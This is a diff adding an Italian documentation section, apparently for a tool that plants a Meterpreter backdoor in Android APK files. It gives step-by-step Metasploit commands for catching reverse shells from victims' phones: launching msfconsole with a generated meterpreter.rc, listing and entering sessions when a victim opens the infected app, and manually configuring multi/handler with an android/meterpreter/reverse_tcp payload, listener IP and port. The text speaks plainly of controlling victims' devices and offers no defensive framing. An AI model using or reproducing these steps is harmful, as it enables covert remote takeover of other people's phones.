@@ -6,4 +6,46 @@ macchina che intercetti i pacchetti inviati dal malware. In questo modo,
 l'attaccante può essere aggiornato sullo stato del malware e controllare a
 distanza i dispositivi delle vittime, sfruttando la _backdoor_ creata.
 
-// TODO: Write me
+L'attivazione della shell avviene sfruttando i comandi forniti da framework
+**Metasploit**. Nello specifico, è necessario attivare una console mediante il
+comando `msfconsole` e configurare l'exploit e il payload da utilizzare.
+
+Il tool sviluppato semplifica questa operazione creando un file di
+configurazione per la console del framework **Metasploit**. Tale file è
+memorizzato nella cartella in cui il comando è stato eseguito, in parallelo al
+file APK infetto. Tale file, memorizzato come `meterpreter.rc` può poi essere
+utilizzato semplicemente con un comando:
+
+[source,shell]
+--------------
+msfconsole -r meterpreter.rc
+--------------
+
+Questo comando avvierà la shell di Metasploit e attiverà l'exploit in
+background. Quando una vittima aprirà l'applicazione, l'attaccante sarà
+avvertito della creazione di una nuova sessione e potrà avviare l'interazione
+con pochi comandi:
+
+[source,shell]
+-------------
+sessions -l # List all sessions
+sessions -i 1 # Interact with session 1
+-------------
+
+Il primo comando non è in realtà necessario: questo serve solo a ottenere una
+lista di sessioni avviate in modo da poterne leggere l'ID da utilizzare nel
+secondo comando (che avvia realmente la comunicazione con il device target).
+
+Nel caso in cui non sia stato creato il file di configurazione di Metasploit, è
+comunque possibile procedere a una configurazione manuale. Per farlo, basta
+avviare la console di Metasploit mediante il comando `msfconsole`, ed eseguire
+poi i seguenti comandi:
+
+[source,shell]
+--------------
+use multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.1.187 # Your private IP
+set LPORT 4444 # The same port used in the malware creation
+exploit -j -z
+--------------
